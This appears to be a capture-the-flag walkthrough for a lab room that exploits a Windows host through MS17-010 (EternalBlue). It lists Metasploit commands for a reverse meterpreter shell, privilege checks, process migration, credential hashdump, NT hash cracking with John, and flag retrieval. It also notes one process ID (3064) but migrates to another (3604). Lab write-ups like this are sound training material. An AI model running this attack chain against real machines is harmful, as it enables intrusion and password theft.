# Task 1
 1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the room RP: Nmap)
 2. How many ports are open with a port number under 1000?
'nmap -sC -sV 10.10.104.20': 3
 3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
'nmap --script=vuln 10.10.104.20': ms17_010
# Task 2
 1. Start Metasploit
'msfconsole'
 2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
'search ms17_010': exploit/windows/smb/ms17_010_eternalblue
'use exploit/windows/smb/ms17_010_eternalblue'
I've read that there's issues with the default payloads in meterpreter at the time of writing this, so I set that manually.
'set PAYLOAD windows/x64/meterpreter/reverse_tcp'
 3. Show options and set the one required value. What is the name of this value? (All caps for submission)
'options': RHOSTS
Now, I set RHOSTS to the target IP address with 'set RHOSTS 10.10.104.20
 4. Run the exploit!
First, since I'm on VPN I need to use 'set LHOST tun0', then, 'exploit'. It failed once and was successful on the second try for me.
# Task 3
 1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
First ctrl+z, then 'search shell_to_meterpreter': post/multi/manage/shell_to_meterpreter
 2. Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)
'use post/multi/manage/shell_to_meterpreter' then 'options': SESSION
 3. Set the required option, you may need to list all of the sessions to find your target here.
'sessions' lists our sessions and their IDs, now 'set SESSION 1'
 4. Run! If this doesn't work, try completing the exploit from the previous task once more.
'exploit'
 5. Once the meterpreter shell conversion completes, select that session for use.
'sessions -i 1'
 6. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 
'getsystem', 'shell', 'whoami'
 7. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
ctrl+z, 'y', then 'ps'. I am going to use 3064 for the TrustedInstaller.exe.
 8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.
'migrate 3604' worked!
# Task 4
 1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
'hashdump': Jon
 2. Copy this password hash to a file and research how to crack it. What is the cracked password?
I copied the whole hash line starting with jon and ending in ::: then paste that into a file I just named hash.
In a seperate terminal I ran 'john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash'
This gave me the password I needed! There is another way to do it from within metasploit, but I did not have my database setup prior to this.
# Task 5
I took to long getting the right syntax for so I had to reexploit the machine, but coming back in I was stil nt\system
I typed 'cd /' and then 'cat flag1.txt' for the first flag.
I then navigated to /Users/Jon/Documents just to peek AND! found flag 3.
Now where is flag2? The hint is supposed to point us to where windows stores its passwords.
With some googling 'cd /windows/system32/config' and there's flag 2!
